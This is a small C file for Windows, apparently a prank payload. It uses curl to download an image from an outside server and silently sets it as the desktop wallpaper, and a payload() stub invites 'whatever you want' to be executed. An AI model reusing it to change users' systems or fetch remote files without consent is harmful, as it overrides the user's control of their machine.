#include <windows.h>
/*
#include <stdio.h>
#include <unistd.h>
//*/
int changeBackground(){
    if (access("C:\\uwubuntu.png", F_OK) != 0 ) {
        //file does not exist
        system("curl http://server.mdbooktech.com/uwubuntu.png -s > C:\\uwubuntu.png");
        //printf("Downloaded uwubuntu.png\n");
    } else {
        char wallpaperpath[300];
        SystemParametersInfo(SPI_GETDESKWALLPAPER, 300, wallpaperpath, 0);
        if (strcmp(wallpaperpath, "C:\\uwubuntu.png") == 0) {
            //printf("Already set\n");
            return 1;
        }
    }
    printf("Not set. Setting...\n");
    const wchar_t *path = L"C:\\uwubuntu.png";
    int result;
    //printf("Setting as desktop background...\n");
    result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void *)path, SPIF_UPDATEINIFILE);
    if (result == 1){
        //printf("Done");
        return 1;
    }
    return 0;
}
int payload(){
    //Execute whatever you want here
    changeBackground();
    
}

/*
int main(int argc, char *argv[]){
    payload();
}
//*/